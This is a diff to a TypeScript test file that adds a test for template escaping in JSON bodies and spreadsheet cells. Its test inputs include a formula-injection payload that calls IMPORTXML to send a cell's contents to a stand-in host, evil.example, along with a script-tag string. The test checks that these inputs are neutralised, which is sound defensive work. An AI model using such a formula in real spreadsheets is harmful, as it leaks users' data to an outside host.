@@ -64,6 +64,22 @@ describe("renderTemplate", () => {
     expect(render("{{trigger.memo}}")).toBe("<script>alert(1)</script> & co");
   });
 
+  it("escapes values for JSON bodies and spreadsheet cells, never the template's own text", () => {
+    const json = renderTemplate('{"memo": "{{trigger.memo}}", "n": {{steps.notify.message_id}}}', scope, { escape: "json" });
+    expect(JSON.parse(json)).toEqual({ memo: "<script>alert(1)</script> & co", n: 42 });
+    const quoted = renderTemplate('{"v": "{{trigger.q}}"}', { trigger: { q: 'say "hi"\n\\o/' } }, { escape: "json" });
+    expect(JSON.parse(quoted)).toEqual({ v: 'say "hi"\n\\o/' });
+
+    const cell = (v: unknown) => renderTemplate("{{trigger.v}}", { trigger: { v } }, { escape: "sheets" });
+    expect(cell('=IMPORTXML("https://evil.example/?"&A1,"//a")')).toBe('\'=IMPORTXML("https://evil.example/?"&A1,"//a")');
+    expect(cell("+1+2")).toBe("'+1+2");
+    expect(cell("@SUM(A1)")).toBe("'@SUM(A1)");
+    expect(cell("-5")).toBe("-5"); // numbers stay numbers
+    expect(cell("1234.5")).toBe("1234.5");
+    expect(cell("USDG")).toBe("USDG");
+    expect(renderTemplate("=SUM(A1:A3) {{trigger.v}}", { trigger: { v: "=1" } }, { escape: "sheets" })).toBe("=SUM(A1:A3) '=1"); // the user's own formula is kept
+  });
+
   it("supports literal braces", () => {
     expect(render("\\{{not a variable}} {{flow.name}}")).toBe("{{not a variable}} Big buys");
   });
